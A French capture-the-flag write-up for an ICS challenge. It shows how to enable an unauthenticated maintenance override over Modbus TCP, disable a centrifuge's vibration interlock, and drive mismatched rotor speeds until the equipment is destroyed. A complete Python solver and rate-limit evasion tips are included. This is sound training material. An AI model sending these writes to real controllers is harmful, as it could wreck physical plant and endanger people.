# OT#007 — Centrifuge Resonance (Modbus TCP réel)

- **Cible :** `<HOST>:<PORT>` — page du challenge : https://otctf.pages.dev/ot-007-centrifuge-resonance/light
- **Catégorie :** OT / ICS
- **Flag :** `CTF{REDACTED}`
- **Protocole :** Modbus TCP réel (pas de variante custom, contrairement aux autres OT)

## Contexte

Un contrôleur de cascade de centrifugeuses à deux rotors. Un interlock de vibration est
censé forcer un arrêt contrôlé avant que la vibration n'atteigne un niveau destructeur —
contrairement aux autres challenges OT de la série, **la protection fonctionne réellement**
ici ; il faut trouver un moyen de la contourner plutôt que d'exploiter une absence pure et
simple de garde-fou.

## Modèle Modbus observé

| Adresse | Type | Rôle |
|---|---|---|
| Coil 0 | coil | POWER / run enable |
| Coil 1 | coil | **MAINTENANCE OVERRIDE** — désactive l'interlock de vibration |
| HR10 | holding register | Setpoint vitesse rotor A (lourd/lent) |
| HR11 | holding register | Setpoint vitesse rotor B (léger/rapide) |
| IR0 | input register | Status bitfield : bit1 = interlock déclenché, bit2 = DESTROYED |
| IR2 | input register | Setpoint A courant (lecture) |
| IR3 | input register | Setpoint B courant (lecture) |
| IR4 | input register | Niveau de vibration |
| IR5+ | input registers | Flag ASCII (1 caractère par registre) une fois DESTROYED atteint |

## Faille

Le coil 1 (**maintenance override**) est accessible sans aucune restriction ni
authentification et désactive complètement l'interlock de vibration censé protéger le
matériel. Une fois activé, rien n'empêche de pousser le système jusqu'à la destruction.

## Méthode

1. **POWER ON** — `coil 0 = True`.
2. **MAINTENANCE OVERRIDE ON** — `coil 1 = True` → l'interlock ne peut plus déclencher
   l'arrêt protecteur.
3. Créer un **mismatch de vitesse** croissant entre les deux rotors : HR10 bas et fixe
   (1500), HR11 monté progressivement (1500 → 3000 → 4000 → 4500 → 6000 → 9000...). La
   vibration (IR4) croît avec l'écart de vitesse entre les rotors.
4. Sans interlock actif pour arrêter le process, la vibration dépasse le seuil destructeur
   → le bit2 (DESTROYED) de IR0 se lève → le flag apparaît en ASCII dans les input
   registers suivants ; filtrer les octets imprimables et chercher `CTF{...}`.

Toute l'opération se fait dans **une seule connexion TCP** persistante : l'état (coils,
setpoints, vibration accumulée) n'est pas garanti de survivre à une reconnexion, et la
séquence doit s'enchaîner sans interruption pour atteindre la destruction avant qu'un
mécanisme externe ne réinitialise le process.

## Script (solver)

Client Modbus TCP minimal fait main (sans dépendance `pymodbus`), implémentant les
function codes `0x01` (read coils), `0x03` (read holding registers), `0x04` (read input
registers), `0x05` (write single coil), `0x06` (write single register) par-dessus le
MBAP header standard.

```python
import time
from mb import MB

def main():
    m = MB(gap=0.03).connect()
    if m.hr(0, 2)[0] == 'dead':
        print("server throttled/down - wait ~5 min of silence and retry"); return
    for i in range(90): m.write_reg(i, 0)          # clean slate
    m.write_coil(0, True)                          # POWER / run enable
    m.write_coil(1, True)                          # MAINTENANCE OVERRIDE -> interlock disabled
    m.write_reg(10, 1500)                          # Rotor A (heavy/slow) setpoint - keep low
    m.write_reg(11, 1500)                          # Rotor B (light/fast) setpoint
    time.sleep(1.5)
    for sp in [3000, 4000, 4500, 6000, 9000, 12000]:
        m.write_reg(11, sp)                        # widen the mismatch -> vibration rises
        for _ in range(2):
            time.sleep(0.8)
            ir = m.ir(0, 90)[1]
            if ir is None: break
            status, vib = ir[0], ir[4]
            if status & 4:                         # bit2 = DESTROYED
                chars = ''.join(chr(v) for v in ir if 32 <= v < 127)
                i = chars.find('CTF{')
                print("FLAG:", chars[i:chars.find('}', i)+1])
                m.close(); return
            if status & 2:                         # bit1 = interlock tripped (shouldn't happen w/ override)
                print("interlock tripped - override not engaged"); m.close(); return
    m.close()

if __name__ == '__main__':
    main()
```

## Résultat

Destruction atteinte dès le palier `HR11=9000` (vibration ≈ 300, bit2 de IR0 levé). Flag
récupéré en lisant les input registers après destruction : `CTF{REDACTED}` — à soumettre
par l'utilisateur.

## Pièges rencontrés

- Un `FC06` (write single register) accuse réception même pour une adresse qu'il ne
  stocke pas réellement — seul `FC16` (write multiple) écrit certains setpoints de
  manière fiable selon l'implémentation ; vérifier systématiquement par relecture plutôt
  que de faire confiance à l'ACK.
- L'état se réinitialise si la séquence POWER → OVERRIDE → mismatch n'est pas enchaînée
  dans la même connexion, ce qui peut donner l'impression à tort que l'override ne
  fonctionne pas.
- Un sweep agressif d'unit-id ou de reconnexions répétées déclenche un rate-limit côté
  serveur ; espacer les tentatives et réutiliser une connexion unique évite le ban.

## Portée réelle

Contrairement aux autres OT de la série (où la protection est simplement absente), ici
l'interlock fonctionne — la faille est l'existence d'un **bypass de maintenance non
protégé**, un classique réel des interlocks industriels (portes d'accès, clés de
maintenance, overrides) : la protection logicielle/process est solide, mais un
mécanisme d'exception pensé pour la maintenance humaine devient une porte dérobée s'il
n'est ni authentifié ni audité. Sur un vrai site, ces mêmes écritures détruiraient du
matériel réel — à ne reproduire que dans le cadre d'un CTF explicitement autorisé.

---

*Write-up par **Le_Geek** — BUG|PWN CTF · OT#007 Centrifuge Resonance.*
